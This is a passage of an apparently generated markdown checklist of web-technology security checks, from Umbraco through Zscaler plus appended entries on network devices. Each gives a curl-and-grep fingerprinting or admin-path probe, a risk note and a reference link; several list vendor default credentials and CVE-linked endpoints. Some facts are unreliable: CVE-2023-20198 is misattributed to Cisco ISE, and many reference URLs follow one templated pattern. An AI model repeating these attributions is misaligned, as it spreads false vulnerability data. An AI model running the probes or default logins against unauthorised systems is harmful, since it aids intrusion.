curl -s http://target.com/umbraco
```

**References:**
- https://umbraco.com/security

---

## Unity
<!-- id: unity | icon: 🛠️ | color: #e06c75 -->
Security checklists for Unity game engine.

### Check Unity for exposed WebGL data
<!-- id: unity-1 | severity: low | tags: unity, game-engine, webgl, 3d -->
Unity WebGL builds may expose game assets, API endpoints, and embedded credentials in compiled JavaScript.

**Commands:**
```bash
curl -s http://target.com | grep -i "unity\|unity\.js\|\.unity3d"
```

**References:**
- https://unity.com/security

---

## UnoCSS
<!-- id: unocss | icon: 🛠️ | color: #e06c75 -->
Security checklists for UnoCSS utility-first CSS engine.

### Check UnoCSS for version exposure
<!-- id: unocss-1 | severity: low | tags: unocss, css, utility, framework -->
UnoCSS version identifiers in stylesheets may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "unocss\|@unocss"
```

**References:**
- https://unocss.dev/security

---

## Unpkg
<!-- id: unpkg | icon: 🛠️ | color: #e06c75 -->
Security checklists for Unpkg CDN service.

### Check Unpkg for exposed package references
<!-- id: unpkg-1 | severity: low | tags: unpkg, cdn, npm, javascript -->
Unpkg URLs in page source may reveal exact package versions and dependencies used by the application.

**Commands:**
```bash
curl -s http://target.com | grep -i "unpkg\.com\|unpkg"
```

**References:**
- https://unpkg.com/security

---

## Uploadcare
<!-- id: uploadcare | icon: 🛠️ | color: #e06c75 -->
Security checklists for Uploadcare file upload platform.

### Check Uploadcare for exposed API key
<!-- id: uploadcare-1 | severity: medium | tags: uploadcare, upload, cdn, files -->
Uploadcare API keys in client-side code may allow unauthorized file uploads and storage access.

**Commands:**
```bash
curl -s http://target.com | grep -i "uploadcare\|ucarecdn"
```

**References:**
- https://uploadcare.com/security/

---

## UptimeRobot
<!-- id: uptimerobot | icon: 🛠️ | color: #e06c75 -->
Security checklists for UptimeRobot monitoring service.

### Check UptimeRobot for exposed API key
<!-- id: uptimerobot-1 | severity: low | tags: uptimerobot, monitoring, uptime, api -->
UptimeRobot API keys in page source may reveal monitor configuration and status data.

**Commands:**
```bash
curl -s http://target.com | grep -i "uptimerobot\|uptime-robot"
```

**References:**
- https://uptimerobot.com/security/

---

## Usercentrics
<!-- id: usercentrics | icon: 🛠️ | color: #e06c75 -->
Security checklists for Usercentrics consent management platform.

### Check Usercentrics for exposed configuration
<!-- id: usercentrics-1 | severity: low | tags: usercentrics, consent, gdpr, cmp -->
Usercentrics configuration IDs may reveal consent settings and data processing vendors.

**Commands:**
```bash
curl -s http://target.com | grep -i "usercentrics\|uc\.usercentrics"
```

**References:**
- https://usercentrics.com/security/

---

## UserVoice
<!-- id: uservoice | icon: 🛠️ | color: #e06c75 -->
Security checklists for UserVoice feedback platform.

### Check UserVoice for exposed widget data
<!-- id: uservoice-1 | severity: low | tags: uservoice, feedback, support, widget -->
UserVoice widget IDs in page source may reveal feedback channels and support ticket configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "uservoice\|widget\.uservoice"
```

**References:**
- https://www.uservoice.com/security/

---

## UserWay
<!-- id: userway | icon: 🛠️ | color: #e06c75 -->
Security checklists for UserWay accessibility platform.

### Check UserWay for exposed widget ID
<!-- id: userway-1 | severity: low | tags: userway, accessibility, widget, a11y -->
UserWay widget identifiers in page source may reveal accessibility configuration and usage data.

**Commands:**
```bash
curl -s http://target.com | grep -i "userway\|userway\.org"
```

**References:**
- https://userway.org/security/

---

## Uvicorn
<!-- id: uvicorn | icon: 🛠️ | color: #e06c75 -->
Security checklists for Uvicorn ASGI server.

### Check Uvicorn for server header disclosure
<!-- id: uvicorn-1 | severity: low | tags: uvicorn, asgi, python, server -->
Uvicorn server headers reveal the ASGI server version for targeted exploit identification.

**Commands:**
```bash
curl -sI http://target.com | grep -i "uvicorn"
```

**References:**
- https://www.uvicorn.org/security/

---

## V2Board
<!-- id: v2board | icon: 🛠️ | color: #e06c75 -->
Security checklists for V2Board proxy panel.

### Check V2Board for exposed admin panel
<!-- id: v2board-1 | severity: high | tags: v2board, proxy, panel, shadowsocks -->
V2Board admin panels exposed may allow unauthorized configuration changes and user data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "v2board"
```

**References:**
- https://github.com/v2board/v2board/security

---

## Vaadin
<!-- id: vaadin | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vaadin web framework.

### Check Vaadin for version exposure
<!-- id: vaadin-1 | severity: medium | tags: vaadin, java, framework, web -->
Vaadin version identifiers may reveal outdated versions with known deserialization vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "vaadin\|vaadin\.js"
```

**References:**
- https://vaadin.com/security

---

## Vanta
<!-- id: vanta | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vanta compliance platform.

### Check Vanta for exposed tracking
<!-- id: vanta-1 | severity: low | tags: vanta, compliance, tracking, javascript -->
Vanta tracking scripts may reveal compliance status and security monitoring configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "vanta\|vanta\.com"
```

**References:**
- https://vanta.com/security

---

## Venmo
<!-- id: venmo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Venmo payment platform.

### Check Venmo for exposed payment reference
<!-- id: venmo-1 | severity: low | tags: venmo, payments, p2p, fintech -->
Venmo payment references in page source may reveal transaction data and user identifiers.

**Commands:**
```bash
curl -s http://target.com | grep -i "venmo\|venmo\.com"
```

**References:**
- https://venmo.com/security/

---

## Vercel
<!-- id: vercel | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vercel deployment platform.

### Check Vercel for exposed deployment config
<!-- id: vercel-1 | severity: low | tags: vercel, hosting, deployment, serverless -->
Vercel configuration identifiers may reveal deployment settings, environment variables, and project structure.

**Commands:**
```bash
curl -s http://target.com | grep -i "vercel\|vercel\.com"
```

**References:**
- https://vercel.com/security/

---

## Vimeo
<!-- id: vimeo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vimeo video platform.

### Check Vimeo for exposed embed data
<!-- id: vimeo-1 | severity: low | tags: vimeo, video, embed, player -->
Vimeo embedded player IDs may reveal video metadata, privacy settings, and user configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "vimeo\|player\.vimeo"
```

**References:**
- https://vimeo.com/security/

---

## Vite
<!-- id: vite | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vite build tool.

### Check Vite for version exposure
<!-- id: vite-1 | severity: low | tags: vite, build-tool, bundler, javascript -->
Vite version identifiers in build output may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "vite\|@vitejs"
```

**References:**
- https://vitejs.dev/security/

---

## Vue.js
<!-- id: vuejs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vue.js framework.

### Check Vue.js for version exposure
<!-- id: vuejs-1 | severity: low | tags: vuejs, framework, javascript, frontend -->
Vue.js version identifiers in JS bundles may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "vue\.js\|vue\.min"
```

**References:**
- https://vuejs.org/security/

---

## Vuetify
<!-- id: vuetify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vuetify UI library.

### Check Vuetify for version exposure
<!-- id: vuetify-1 | severity: low | tags: vuetify, vue, ui, material -->
Vuetify version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "vuetify\|vuetify\.js"
```

**References:**
- https://vuetifyjs.com/security/

---

## Vultr
<!-- id: vultr | icon: 🛠️ | color: #e06c75 -->
Security checklists for Vultr cloud hosting.

### Check Vultr for exposed server IP
<!-- id: vultr-1 | severity: low | tags: vultr, cloud, hosting, vps -->
Vultr server IPs and hostnames may reveal cloud provider and server location information.

**Commands:**
```bash
curl -sI http://target.com | grep -i "vultr"
```

**References:**
- https://www.vultr.com/security/

---

## Wagtail
<!-- id: wagtail | icon: 🛠️ | color: #e06c75 -->
Security checklists for Wagtail CMS.

### Check Wagtail for exposed admin panel
<!-- id: wagtail-1 | severity: high | tags: wagtail, cms, python, django -->
Wagtail admin panels exposed may allow unauthorized content modification and user enumeration.

**Commands:**
```bash
curl -s http://target.com/admin
```

**References:**
- https://wagtail.org/security/

---

## WebAssembly
<!-- id: webassembly | icon: 🛠️ | color: #e06c75 -->
Security checklists for WebAssembly binary format.

### Check WebAssembly for exposed wasm files
<!-- id: webassembly-1 | severity: medium | tags: webassembly, wasm, binary, browser -->
WebAssembly binaries may expose proprietary algorithms, credentials, and business logic in compiled form.

**Commands:**
```bash
curl -s http://target.com | grep -i "\.wasm\|wasm"
```

**References:**
- https://webassembly.org/security/

---

## Webflow
<!-- id: webflow | icon: 🛠️ | color: #e06c75 -->
Security checklists for Webflow website builder.

### Check Webflow for exposed site data
<!-- id: webflow-1 | severity: low | tags: webflow, website-builder, no-code, cms -->
Webflow site identifiers may reveal design assets, CMS collections, and project configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "webflow\|webflow\.js"
```

**References:**
- https://webflow.com/security/

---

## Webpack
<!-- id: webpack | icon: 🛠️ | color: #e06c75 -->
Security checklists for Webpack module bundler.

### Check Webpack for exposed source maps
<!-- id: webpack-1 | severity: medium | tags: webpack, bundler, javascript, build -->
Webpack source maps in production expose original source code and internal application logic.

**Commands:**
```bash
curl -s http://target.com | grep -i "webpack\|webpack\.js"
```

**References:**
- https://webpack.js.org/security/

---

## Weglot
<!-- id: weglot | icon: 🛠️ | color: #e06c75 -->
Security checklists for Weglot translation service.

### Check Weglot for exposed API key
<!-- id: weglot-1 | severity: low | tags: weglot, translation, i18n, localization -->
Weglot API keys in page source may allow unauthorized translation management and usage data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "weglot\|weglot\.js"
```

**References:**
- https://weglot.com/security/

---

## WHMCS
<!-- id: whmcs | icon: 🛠️ | color: #e06c75 -->
Security checklists for WHMCS hosting automation platform.

### Check WHMCS for exposed admin panel
<!-- id: whmcs-1 | severity: high | tags: whmcs, hosting, billing, automation -->
WHMCS admin panels exposed may allow unauthorized billing data access and customer information disclosure.

**Commands:**
```bash
curl -s http://target.com/whmcs/admin
```

**References:**
- https://www.whmcs.com/security/

---

## Wix
<!-- id: wix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Wix website builder.

### Check Wix for exposed site data
<!-- id: wix-1 | severity: low | tags: wix, website-builder, cms, saas -->
Wix site identifiers may reveal page metadata, API endpoints, and third-party integration details.

**Commands:**
```bash
curl -s http://target.com | grep -i "wix\|wix\.com"
```

**References:**
- https://www.wix.com/security/

---

## WooCommerce
<!-- id: woocommerce | icon: 🛠️ | color: #e06c75 -->
Security checklists for WooCommerce ecommerce platform.

### Check WooCommerce for version exposure
<!-- id: woocommerce-1 | severity: medium | tags: woocommerce, ecommerce, wordpress, shop -->
WooCommerce version identifiers may reveal outdated versions with known payment and data exposure vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "woocommerce\|wc-"
```

**References:**
- https://woocommerce.com/security/

---

## Wordfence
<!-- id: wordfence | icon: 🛠️ | color: #e06c75 -->
Security checklists for Wordfence security plugin.

### Check Wordfence for version exposure
<!-- id: wordfence-1 | severity: low | tags: wordfence, security, wordpress, firewall -->
Wordfence version identifiers may reveal outdated firewall rules and security configurations.

**Commands:**
```bash
curl -s http://target.com | grep -i "wordfence\|wf-"
```

**References:**
- https://www.wordfence.com/security/

---

## Workday
<!-- id: workday | icon: 🛠️ | color: #e06c75 -->
Security checklists for Workday cloud HR platform.

### Check Workday for exposed API endpoint
<!-- id: workday-1 | severity: medium | tags: workday, hr, cloud, saas -->
Workday API endpoints may reveal employee information, organizational structure, and authentication configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "workday\|myworkday"
```

**References:**
- https://www.workday.com/security/

---

## WP Engine
<!-- id: wp-engine | icon: 🛠️ | color: #e06c75 -->
Security checklists for WP Engine hosting platform.

### Check WP Engine for exposed config
<!-- id: wp-engine-1 | severity: low | tags: wpengine, hosting, wordpress, managed -->
WP Engine installation identifiers may reveal hosting configuration and environment details.

**Commands:**
```bash
curl -sI http://target.com | grep -i "wp-engine\|wpengine"
```

**References:**
- https://wpengine.com/security/

---

## WP Rocket
<!-- id: wp-rocket | icon: 🛠️ | color: #e06c75 -->
Security checklists for WP Rocket caching plugin.

### Check WP Rocket for version exposure
<!-- id: wp-rocket-1 | severity: low | tags: wp-rocket, caching, wordpress, performance -->
WP Rocket version identifiers may reveal outdated caching configurations with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "wp-rocket\|wprocket"
```

**References:**
- https://wp-rocket.me/security/

---

## WPForms
<!-- id: wpforms | icon: 🛠️ | color: #e06c75 -->
Security checklists for WPForms form builder.

### Check WPForms for exposed form data
<!-- id: wpforms-1 | severity: medium | tags: wpforms, forms, wordpress, builder -->
WPForms configuration may leak form field structure, submission data, and notification settings.

**Commands:**
```bash
curl -s http://target.com | grep -i "wpforms"
```

**References:**
- https://wpforms.com/security/

---

## Wufoo
<!-- id: wufoo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Wufoo form builder.

### Check Wufoo for exposed form data
<!-- id: wufoo-1 | severity: medium | tags: wufoo, forms, surveys, saas -->
Wufoo form IDs in page source may reveal form structure, submission data, and notification settings.

**Commands:**
```bash
curl -s http://target.com | grep -i "wufoo\|wufoo\.com"
```

**References:**
- https://www.wufoo.com/security/

---

## X-Cart
<!-- id: x-cart | icon: 🛠️ | color: #e06c75 -->
Security checklists for X-Cart ecommerce platform.

### Check X-Cart for version exposure
<!-- id: x-cart-1 | severity: high | tags: x-cart, ecommerce, php, shopping-cart -->
X-Cart version identifiers may reveal outdated versions with known SQL injection and XSS vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "x-cart\|xcart"
```

**References:**
- https://www.x-cart.com/security/

---

## XAMPP
<!-- id: xampp | icon: 🛠️ | color: #e06c75 -->
Security checklists for XAMPP development server.

### Check XAMPP for exposed default pages
<!-- id: xampp-1 | severity: high | tags: xampp, apache, phpmyadmin, development -->
XAMPP default pages and phpMyAdmin access exposed may allow database access and server information disclosure.

**Commands:**
```bash
curl -s http://target.com/xampp
curl -s http://target.com/phpmyadmin
```

**References:**
- https://www.apachefriends.org/security/

---

## XenForo
<!-- id: xenforo | icon: 🛠️ | color: #e06c75 -->
Security checklists for XenForo forum software.

### Check XenForo for version exposure
<!-- id: xenforo-1 | severity: high | tags: xenforo, forum, community, php -->
XenForo version identifiers may reveal outdated versions with known vulnerabilities and user data exposure.

**Commands:**
```bash
curl -s http://target.com | grep -i "xenforo"
```

**References:**
- https://xenforo.com/security/

---

## XWiki
<!-- id: xwiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for XWiki platform.

### Check XWiki for exposed content
<!-- id: xwiki-1 | severity: medium | tags: xwiki, wiki, collaboration, java -->
XWiki instances may expose sensitive internal documentation and user account information.

**Commands:**
```bash
curl -s http://target.com | grep -i "xwiki"
```

**References:**
- https://www.xwiki.org/security/

---

## Xsolla
<!-- id: xsolla | icon: 🛠️ | color: #e06c75 -->
Security checklists for Xsolla payment platform.

### Check Xsolla for exposed API key
<!-- id: xsolla-1 | severity: medium | tags: xsolla, payments, gaming, fintech -->
Xsolla API keys in client-side code may allow unauthorized payment operations and transaction data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "xsolla"
```

**References:**
- https://xsolla.com/security/

---

## Yandex
<!-- id: yandex | icon: 🛠️ | color: #e06c75 -->
Security checklists for Yandex services.

### Check Yandex for exposed tracking ID
<!-- id: yandex-1 | severity: low | tags: yandex, analytics, tracking, russia -->
Yandex.Metrika tracking IDs may reveal analytics account configuration and visitor data.

**Commands:**
```bash
curl -s http://target.com | grep -i "yandex\|yandex\.metrika"
```

**References:**
- https://yandex.com/security/

---

## Yii
<!-- id: yii | icon: 🛠️ | color: #e06c75 -->
Security checklists for Yii PHP framework.

### Check Yii for version exposure
<!-- id: yii-1 | severity: medium | tags: yii, php, framework, mvc -->
Yii version identifiers may reveal outdated versions with known deserialization and SQL injection vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "yii\|yiisoft"
```

**References:**
- https://www.yiiframework.com/security/

---

## Yoast SEO
<!-- id: yoast-seo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Yoast SEO plugin.

### Check Yoast SEO for version exposure
<!-- id: yoast-seo-1 | severity: low | tags: yoast, seo, wordpress, plugin -->
Yoast SEO version identifiers may reveal outdated plugin versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "yoast\|yoast-seo"
```

**References:**
- https://yoast.com/security/

---

## Yotpo
<!-- id: yotpo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Yotpo marketing platform.

### Check Yotpo for exposed API key
<!-- id: yotpo-1 | severity: low | tags: yotpo, reviews, loyalty, marketing -->
Yotpo API keys in page source may allow unauthorized access to review data and customer information.

**Commands:**
```bash
curl -s http://target.com | grep -i "yotpo\|yotpo\.com"
```

**References:**
- https://www.yotpo.com/security/

---

## YouTube
<!-- id: youtube | icon: 🛠️ | color: #e06c75 -->
Security checklists for YouTube video platform.

### Check YouTube for exposed embed data
<!-- id: youtube-1 | severity: low | tags: youtube, video, embed, google -->
YouTube embedded player parameters may reveal video metadata, playlist information, and channel configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "youtube\.com\|youtu\.be\|yt-player"
```

**References:**
- https://www.youtube.com/security/

---

## YouTrack
<!-- id: youtrack | icon: 🛠️ | color: #e06c75 -->
Security checklists for YouTrack issue tracker.

### Check YouTrack for exposed admin panel
<!-- id: youtrack-1 | severity: high | tags: youtrack, jetbrains, issue-tracker, management -->
YouTrack admin panels exposed may allow unauthorized access to project data and user management.

**Commands:**
```bash
curl -s http://target.com | grep -i "youtrack\|jetbrains"
```

**References:**
- https://www.jetbrains.com/youtrack/security/

---

## Zammad
<!-- id: zammad | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zammad helpdesk platform.

### Check Zammad for exposed admin panel
<!-- id: zammad-1 | severity: high | tags: zammad, helpdesk, support, ticket -->
Zammad admin panels exposed may allow unauthorized access to support tickets and user data.

**Commands:**
```bash
curl -s http://target.com | grep -i "zammad"
```

**References:**
- https://zammad.com/security/

---

## Zend Framework
<!-- id: zend-framework | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zend Framework.

### Check Zend Framework for version exposure
<!-- id: zend-framework-1 | severity: medium | tags: zend, php, framework, mvc -->
Zend Framework version identifiers may reveal outdated versions with known deserialization and injection vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "zend\|zf-"
```

**References:**
- https://framework.zend.com/security/

---

## Zendesk
<!-- id: zendesk | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zendesk customer support platform.

### Check Zendesk for exposed widget data
<!-- id: zendesk-1 | severity: low | tags: zendesk, support, helpdesk, widget -->
Zendesk widget IDs may reveal support configuration, help center articles, and ticket settings.

**Commands:**
```bash
curl -s http://target.com | grep -i "zendesk\|zopim\|widget\.zendesk"
```

**References:**
- https://www.zendesk.com/security/

---

## Zen Cart
<!-- id: zen-cart | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zen Cart ecommerce platform.

### Check Zen Cart for version exposure
<!-- id: zen-cart-1 | severity: high | tags: zen-cart, ecommerce, php, shopping-cart -->
Zen Cart version identifiers may reveal outdated versions with known SQL injection and XSS vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "zen-cart\|zencart"
```

**References:**
- https://www.zen-cart.com/security/

---

## Zenfolio
<!-- id: zenfolio | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zenfolio photography platform.

### Check Zenfolio for exposed content
<!-- id: zenfolio-1 | severity: low | tags: zenfolio, photography, portfolio, hosting -->
Zenfolio site identifiers may reveal portfolio content, client galleries, and account configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "zenfolio\|zenfolio\.com"
```

**References:**
- https://www.zenfolio.com/security/

---

## Zoho
<!-- id: zoho | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zoho business suite.

### Check Zoho for exposed API key
<!-- id: zoho-1 | severity: medium | tags: zoho, crm, saas, business -->
Zoho API keys in page source may allow unauthorized access to CRM data, email accounts, and business records.

**Commands:**
```bash
curl -s http://target.com | grep -i "zoho\|zoho\.com"
```

**References:**
- https://www.zoho.com/security/

---

## Zola
<!-- id: zola | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zola wedding platform.

### Check Zola for exposed registry data
<!-- id: zola-1 | severity: low | tags: zola, wedding, registry, ecommerce -->
Zola registry identifiers may reveal gift data, guest information, and event configuration.

**Commands:**
```bash
curl -s http://target.com | grep -i "zola\|zola\.com"
```

**References:**
- https://www.zola.com/security/

---

## Zone.js
<!-- id: zonejs | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zone.js library.

### Check Zone.js for version exposure
<!-- id: zonejs-1 | severity: low | tags: zonejs, angular, javascript, async -->
Zone.js version identifiers in JS bundles may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "zone\.js\|zone\.min"
```

**References:**
- https://github.com/angular/zone.js/security

---

## Zoom
<!-- id: zoom | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zoom video conferencing.

### Check Zoom for exposed SDK key
<!-- id: zoom-1 | severity: medium | tags: zoom, video, conferencing, sdk -->
Zoom SDK keys and meeting IDs in page source may allow unauthorized meeting access and participant data exposure.

**Commands:**
```bash
curl -s http://target.com | grep -i "zoom\|zoom\.us\|zoom\.com"
```

**References:**
- https://zoom.com/security/

---

## Zulip
<!-- id: zulip | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zulip chat platform.

### Check Zulip for exposed API key
<!-- id: zulip-1 | severity: medium | tags: zulip, chat, collaboration, python -->
Zulip API keys in page source may allow unauthorized message access and channel data exposure.

**Commands:**
```bash
curl -s http://target.com | grep -i "zulip"
```

**References:**
- https://zulip.com/security/

---

## Zuora
<!-- id: zuora | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zuora billing platform.

### Check Zuora for exposed API key
<!-- id: zuora-1 | severity: medium | tags: zuora, billing, subscription, saas -->
Zuora API keys in client-side code may allow unauthorized access to subscription data and payment information.

**Commands:**
```bash
curl -s http://target.com | grep -i "zuora"
```

**References:**
- https://www.zuora.com/security/

---

## Zscaler
<!-- id: zscaler | icon: 🛠️ | color: #e06c75 -->
Security checklists for Zscaler cloud security.

### Check Zscaler for exposed portal
<!-- id: zscaler-1 | severity: low | tags: zscaler, security, proxy, cloud -->
Zscaler portal references may reveal cloud security configuration and organizational network details.

**Commands:**
```bash
curl -s http://target.com | grep -i "zscaler"
```

**References:**
- https://www.zscaler.com/security/

---

## ZURB Foundation
<!-- id: zurb-foundation | icon: 🛠️ | color: #e06c75 -->
Security checklists for ZURB Foundation CSS framework.

### Check ZURB Foundation for version exposure
<!-- id: zurb-foundation-1 | severity: low | tags: foundation, css, framework, responsive -->
ZURB Foundation version identifiers in stylesheets may reveal outdated versions with known issues.

**Commands:**
```bash
curl -s http://target.com | grep -i "foundation\.css\|foundation\.min"
```

**References:**
- https://get.foundation/security/

---

## authorize.net
<!-- id: authorize-net | icon: 🛠️ | color: #e06c75 -->
Security checklists for Authorize.Net payment gateway.

### Check Authorize.Net for exposed API key
<!-- id: authorize-net-1 | severity: high | tags: authorize-net, payments, gateway, visa -->
Authorize.Net API keys in client-side code may allow unauthorized payment processing and transaction data access.

**Commands:**
```bash
curl -s http://target.com | grep -i "authorize\.net\|authorizenet"
```

**References:**
- https://www.authorize.net/security/

---

## amCharts
<!-- id: amcharts | icon: 🛠️ | color: #e06c75 -->
Security checklists for amCharts charting library.

### Check amCharts for version exposure
<!-- id: amcharts-1 | severity: low | tags: amcharts, charts, visualization, javascript -->
amCharts version identifiers in JS files may reveal outdated versions with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "amcharts\|amcharts\.js"
```

**References:**
- https://www.amcharts.com/security/

---

## bbPress
<!-- id: bbpress | icon: 🛠️ | color: #e06c75 -->
Security checklists for bbPress forum software.

### Check bbPress for version exposure
<!-- id: bbpress-1 | severity: medium | tags: bbpress, forum, wordpress, community -->
bbPress version identifiers may reveal outdated versions with known vulnerabilities and user data exposure.

**Commands:**
```bash
curl -s http://target.com | grep -i "bbpress\|bbp-"
```

**References:**
- https://bbpress.org/security/

---

## WPBakery
<!-- id: wpbakery | icon: 🛠️ | color: #e06c75 -->
Security checklists for WPBakery popular WordPress page builder plugin.

### Check WPBakery for exposed version information
<!-- id: wpbakery-1 | severity: medium | tags: wpbakery, wordpress, page-builder, plugin -->
WPBakery version exposure can be used to identify outdated installations with known vulnerabilities.

**Commands:**
```bash
curl -s http://target.com | grep -i "js_composer\|wpbakery\|vc_"
```

**References:**
- https://wpbakery.com/changelog/

### Check WPBakery for stored XSS via shortcode injection
<!-- id: wpbakery-2 | severity: high | tags: wpbakery, xss, shortcode, wordpress -->
WPBakery custom shortcodes may allow stored XSS when user input is not properly sanitized before rendering.

**References:**
- https://wpbakery.com/security/

---

## Ubiquiti UniFi Network
<!-- id: ubiquiti-unifi | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ubiquiti UniFi Network Controller platform.

### Check UniFi for exposed controller with default credentials
<!-- id: unifi-1 | severity: critical | tags: ubiquiti, unifi, default-creds, wifi -->
UniFi Network Controller with default credentials (ubnt/ubnt) gives attackers full control of all connected access points, network segmentation, and user traffic.

**References:**
- https://community.ui.com/releases

### Check UniFi for API authentication bypass (CVE-2021-22914)
<!-- id: unifi-2 | severity: critical | tags: ubiquiti, unifi, auth-bypass, cve -->
CVE-2021-22914 allows unauthenticated access to UniFi API endpoints, exposing network topology, connected client details, and device credentials.

**Commands:**
```bash
curl -s http://target.com:8443/api/s/default/stat/sta | jq .
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22914

---

## Cisco ISE
<!-- id: cisco-ise | icon: 🛠️ | color: #e06c75 -->
Security checklists for Cisco Identity Services Engine network access control platform.

### Check Cisco ISE for unauthenticated API access and credential exposure
<!-- id: cisco-ise-1 | severity: critical | tags: cisco-ise, api, credential-exposure, unauthorized-access -->
Cisco ISE admin portal exposed without authentication reveals network access policies, endpoint identities, and guest user credentials.

**References:**
- https://tools.cisco.com/security/center/publicationListing/Cisco%20ISE

### Check Cisco ISE for path traversal RCE (CVE-2023-20198)
<!-- id: cisco-ise-2 | severity: critical | tags: cisco-ise, rce, path-traversal, cve -->
CVE-2023-20198 and related Cisco ISE vulnerabilities allow unauthenticated path traversal leading to Remote Code Execution on network access control appliances.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-20198

---

## Ruckus Wireless
<!-- id: ruckus | icon: 🛠️ | color: #e06c75 -->
Security checklists for Ruckus Wireless (CommScope/Brocade) access points and controllers.

### Check Ruckus for unauthenticated command injection (CVE-2023-24816)
<!-- id: ruckus-1 | severity: critical | tags: ruckus, command-injection, rce, wifi, cve -->
Multiple Ruckus wireless controllers contain unauthenticated command injection in web management interfaces, enabling full network device compromise.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-24816

### Check Ruckus for default credentials and exposed admin panels
<!-- id: ruckus-2 | severity: high | tags: ruckus, default-creds, admin, wifi -->
Ruckus ZoneDirector and Unleashed controllers with default credentials (super/sp-admin) expose all SSID configurations and connected station data.

**References:**
- https://www.commscope.com/security/

---

## DotCMS
<!-- id: dotcms | icon: 🛠️ | color: #e06c75 -->
Security checklists for DotCMS enterprise Java content management platform.

### Check DotCMS for path traversal and file disclosure
<!-- id: dotcms-1 | severity: high | tags: dotcms, path-traversal, file-read, cve -->
Multiple DotCMS versions have contained unauthenticated path traversal vulnerabilities exposing server configuration files and database credentials.

**References:**
- https://www.dotcms.com/security/

### Check DotCMS for cross-site scripting in content fields
<!-- id: dotcms-2 | severity: high | tags: dotcms, xss, cms -->
DotCMS content fields without HTML sanitization allow stored XSS, compromising content editors and site visitors.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=dotcms

---

## Revive Adserver
<!-- id: revive-adserver | icon: 🛠️ | color: #e06c75 -->
Security checklists for Revive Adserver open-source ad serving platform.

### Check Revive Adserver for SQL injection and credential exposure
<!-- id: revive-1 | severity: critical | tags: revive-adserver, sqli, credential-exposure, cve -->
Revive Adserver has multiple CVEs for SQL injection allowing unauthenticated database access and administrative credential exposure.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=revive+adserver

### Check Revive Adserver for default admin credentials
<!-- id: revive-2 | severity: high | tags: revive-adserver, default-creds, admin -->
Revive Adserver installations with default or weak admin credentials expose ad campaign data, publisher payouts, and allow arbitrary JavaScript injection across ad zones.

**References:**
- https://www.revive-adserver.com/security/

---

## NUUO
<!-- id: nuuo | icon: 🛠️ | color: #e06c75 -->
Security checklists for NUUO surveillance and NVR video management systems.

### Check NUUO for unauthenticated file upload RCE (CVE-2024-4192)
<!-- id: nuuo-1 | severity: critical | tags: nuuo, rce, file-upload, nvr, cve -->
CVE-2024-4192 allows unauthenticated file upload in NUUO NVR systems, enabling webshell deployment and full surveillance system compromise.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4192

### Check NUUO for exposed camera feeds and default credentials
<!-- id: nuuo-2 | severity: high | tags: nuuo, default-creds, camera-feed, surveillance -->
NUUO systems with default credentials expose all connected camera feeds, recorded footage, and PTZ control to attackers.

**References:**
- https://www.nuuo.com/security-advisory/

---

## AVideo (YouPHPTube)
<!-- id: avideo | icon: 🛠️ | color: #e06c75 -->
Security checklists for AVideo open-source video sharing platform.

### Check AVideo for SQL injection and RCE
<!-- id: avideo-1 | severity: critical | tags: avideo, sqli, rce, video-platform -->
Multiple AVideo versions contain SQL injection and file upload vulnerabilities enabling unauthenticated Remote Code Execution.

**References:**
